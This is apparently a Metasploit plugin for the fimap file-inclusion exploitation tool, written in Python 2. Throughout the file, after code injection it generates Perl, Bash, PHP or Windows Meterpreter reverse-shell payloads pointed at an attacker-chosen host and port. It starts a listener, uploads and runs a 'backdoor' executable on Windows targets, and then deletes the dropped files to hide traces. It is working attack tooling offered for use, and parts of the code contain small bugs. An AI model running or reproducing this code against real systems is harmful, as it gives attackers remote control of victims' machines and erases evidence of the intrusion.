# 
# Copyright (c) 2010 Xavier Garcia  xavi.garcia@gmail.com
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.



from plugininterface import basePlugin

from plugins.msf.pymetasploit.MetasploitWrapper import *
from plugins.msf.pymetasploit.MetasploitXmlRpcListener import *
import getpass, tempfile, os

class msf(basePlugin):

    isShellCode=False
    lhost=""
    lport=""
        
    def plugin_init(self):
        pass
        
    def plugin_loaded(self):
        pass
        
     
    def plugin_exploit_modes_requested(self, langClass, isSystem, isUnix):
        # This method will be called just befor the user gets the 'available attack' screen.
        # You can see that we get the 
        #     * langClass (which represents the current language of the script)
        #     * A boolean value 'isSystem' which tells us if we can inject system commands.
        #     * And another boolean 'isUnix' which will be true if it's a unix-like system and false if it's Windows.
        # We should return a array which contains tuples with a label and a unique callback string.
        ret = []

        #print "Language: " + langClass.getName()
        
        if (isSystem):
            attack = ("Executes MSF reverse payloads", "msf.reverse_tcp")
            ret.append(attack)
        
        return(ret)


    def msf_menu_unix(self,msfObj,lhost,lport,haxhelper):
    	print "Available payloads:"
    	print "1) Perl reverse tcp"
    	print "2) Bash reverse tcp"
    	print "3) PHP reverse tcp"
    	result=raw_input("Choose your payload: ")
    	if int(result) == 1:
    		self.isShellCode=True
    		msfObj.linuxPerlReverseShell(lhost,lport)
    		msfObj.createPayload()
    		return True
    	elif int(result) == 2:
    		self.isShellCode=True
    		msfObj.linuxBashReverseShell(lhost,lport)
    		msfObj.createPayload()
    		print "Warning: Fimap will hang and crash because this Bash payload will run in foreground"
    		return True
    	elif int(result)==3:
    		self.isShellCode=False
    		if haxhelper.getLangName() =="php":
    			isShellCode=False
    			msfObj.phpReverseShell(lhost,lport)
    			msfObj.createPayload()
    			msfObj.loadCustomPayload("<?php\n"+msfObj.getPayload()+"\n?>")
    			print "Warning: Fimap will hang and crash because this PHP payload will run in foreground"
    			return True
    		else:
    			return False
    	else:
    		self.msf_menu_unix(msfobj,lhost,lport,haxhelper)


    def get_parameters(self):
		self.lhost=raw_input("Please, introduce lhost: ")
		self.lhost=self.lhost.strip("\n")
		self.lport=raw_input("Please, introduce lport: ")
		self.lport=self.lport.strip("\n")
		self.password=getpass.getpass("Please, introduce the password for msfconsole: ")

    def set_listener(self,payload):
		Listener=MsfXmlRpcListener()
		Listener.setPassword(self.password)
		Listener.setLhost(self.lhost)
		Listener.setLport(self.lport)
		Listener.setPayload(payload)
		print "Creating listener... "
		try:
			Listener.login()
			Listener.launchHandler()
			print "Listener created: PAYLOAD:%s  LHOST:%s LPORT:%s " % (Listener.getPayload(),Listener.getLhost(),Listener.getLport())
		except MsfXmlRpcListenerErr,err:
		        print err
	
        
    def plugin_callback_handler(self, callbackstring, haxhelper):
        # This function will be launched if the user selected one of your attacks.
        # The two params you receive here are:
        #    * callbackstring - The string you have defined in plugin_exploit_modes_requested.
        #    * haxhelper - A little class which makes it very easy to send an injected command.
        
        if (callbackstring == "msf.reverse_tcp"):
            
            if (haxhelper.isUnix()):
                # We are in unix
		
		msfObj=MsfWrapper()
		self.get_parameters()

		if not self.msf_menu_unix(msfObj,self.lhost,self.lport,haxhelper): 
			print "Sorry, this is payload not supported in this architecture!"
			return 0
		
		self.set_listener("cmd/unix/reverse_netcat")
		
		print "Executing your payload ... "
		if self.isShellCode:
			haxhelper.executeSystemCommand(msfObj.getPayload())
		else: haxhelper.executeCode(msfObj.getPayload())

            else:
		self.get_parameters()
		msfObj=MsfWrapper()
		msfObj.winMeterpreterReverseTcp(self.lhost,self.lport)
		msfObj.createPayload()
		msfObj.encodeWinDebug()

                fd, tmpPayload = tempfile.mkstemp(prefix="pymetasploit")
                os.close(fd)
                fd=open(tmpPayload,'w')
                fd.write(msfObj.getPayload())
                fd.close()

            	tmpDir=haxhelper.executeSystemCommand("echo %TEMP%")
            	haxhelper.executeSystemCommand(haxhelper.concatCommands(("cd "+tmpDir, " > T")))
            	dest = tmpDir+"\\backdoor.bat"
            	bytes = haxhelper.uploadfile(tmpPayload, dest, -1)
		os.remove(tmpPayload)
            	print "%d bytes written to '%s'." %(bytes, dest)
		self.set_listener("windows/meterpreter/reverse_tcp")
            	print "Launching now..."
            	command = haxhelper.concatCommands(("cd "+tmpDir, dest))
            	haxhelper.executeSystemCommand(command)
            	haxhelper.executeSystemCommand(tmpDir+"\\backdoor.exe")
            	haxhelper.executeSystemCommand("del "+tmpDir+"\\backdoor.exe")
            	haxhelper.executeSystemCommand("del "+tmpDir+"\\backdoor.bat")
            	haxhelper.executeSystemCommand("del "+tmpDir+"\\T")
		
